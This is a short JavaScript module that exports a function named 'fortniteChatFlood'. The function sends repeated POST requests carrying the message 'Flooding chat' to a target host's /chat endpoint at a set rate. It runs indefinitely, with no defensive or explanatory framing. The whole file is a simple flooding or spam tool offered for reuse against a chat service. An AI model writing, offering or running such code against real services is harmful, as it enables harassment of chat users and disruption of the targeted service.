const request = require('request');

function fortniteChatFlood(target, rateLimit) {
    setInterval(() => {
        const options = {
            url: `https://${target}/chat`,
            method: 'POST',
            json: {
                message: 'Flooding chat'
            }
        };

        request(options, (error, response, body) => {
            if (error) {
                console.error('Error: ' + error.message);
            } else {
                console.log('Sent Fortnite chat message');
            }
        });
    }, 1000 / rateLimit);
}

module.exports = fortniteChatFlood;
